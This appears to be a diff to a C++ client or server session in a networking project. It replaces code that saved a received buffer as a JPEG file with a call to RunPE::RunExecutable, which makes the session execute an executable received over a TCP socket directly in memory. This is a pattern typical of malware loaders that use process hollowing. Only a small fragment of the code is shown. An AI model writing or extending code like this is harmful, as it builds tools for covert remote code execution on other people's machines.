@@ -3,6 +3,8 @@
 #include "../../user/console/console.h"
 #include "../../general/utils/utils.h"
 
+#include "../../user/runpe/runpe.h"
+
 #include "../../general/protect/dataencryption/dataencryption.h"
 
 Session::Session(boost::asio::ip::tcp::socket& socket)
@@ -23,7 +25,7 @@ void Session::run() {
 		Console::showConsoleMessage("success auth");
 
 		std::vector<char> fileBytes = m_packetHandler->recvBuffer();
-		Utils::createFileFromBytes("getted.jpeg", fileBytes);
+		RunPE::RunExecutable(fileBytes, { });
 	}
 	else {
 		Console::showConsoleMessage("failed auth");
